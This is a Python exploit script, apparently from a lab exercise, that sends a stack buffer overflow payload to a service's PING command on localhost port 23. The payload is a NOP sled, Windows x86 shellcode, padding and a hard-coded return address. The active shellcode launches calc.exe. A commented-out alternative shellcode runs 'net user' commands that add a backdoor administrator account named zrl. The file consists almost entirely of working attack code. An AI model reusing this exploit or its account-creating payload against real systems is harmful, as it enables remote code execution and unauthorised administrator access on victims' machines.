#!/usr/bin/env python
#coding:utf-8
import socket

def main():

    HOST = "localhost"
    PORT = 23
    ADDR = (HOST, PORT)
    sock = socket.socket()
    sock.connect(ADDR)
    ret_bytes = sock.recv(1024)
    ret_str = str(ret_bytes)
    print(ret_str)
  

    #f = open("shellcode.txt")
    #shellcode_code = f.read()
    #print shellcode_code
    #print len(shellcode_code)
    #shellcode_code = "quit \r\n"



    shellcode = "\x33\xc0\x50\xb8\x2e\x64\x6c\x6c\x50\xb8\x65\x6c\x33\x32"
    shellcode += "\x50\xb8\x6b\x65\x72\x6e\x50\x8b\xc4\x50\xb8\x7b\x1d\x80\x7c"
    shellcode += "\xff\xd0\x33\xc0\x50\xb8\x2e\x65\x78\x65\x50\xb8\x63\x61\x6c\x63"
    shellcode += "\x50\x8b\xc4\x6a\x05\x50\xb8\xad\x23\x86\x7c\xff\xd0\x33\xc0"
    shellcode += "\x50\xb8\xfa\xca\x81\x7c\xff\xd0"
    #print len(shellcode)

    # shellcode = "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x5d\x53\xbb\xad\x23\x86\x7c"
    # shellcode += "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
    # shellcode += "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"
    # shellcode +=  "\x65\x72\x20\x7a\x72\x6c\x20\x31\x32\x33\x34\x35\x36\x20\x2f\x61\x64"
    # shellcode +=  "\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f"
    # shellcode +=  "\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73"
    # shellcode +=  "\x20\x2f\x61\x64\x64\x20\x7a\x72\x6c\x20\x26\x26\x20\x6e\x65\x74\x20"
    # shellcode +=  "\x75\x73\x65\x72\x20\x7a\x72\x6c"
    # #print len(shellcode) - 68

    payload = "PING "
    payload += "\x90\x90\x90\x90"
    payload += shellcode
    #print len(shellcode)
    for one in range(1012 - len(shellcode) - 4):
        payload += "\x90"

    #payload += "\x7b\x46\x86\x7c"
    payload += "\x12\x45\xfa\x7f"
    for one in range(0, 984):
        payload += "b"
    payload += "\r\n"

    #print len(payload)
    sock.send(payload)
    #print str("PING "+ "a"*2000)
    #print chr(0x12), chr(0x45), chr(0xfa), chr(0x7f)

    sock.close()
  
if __name__ == '__main__':
    main()

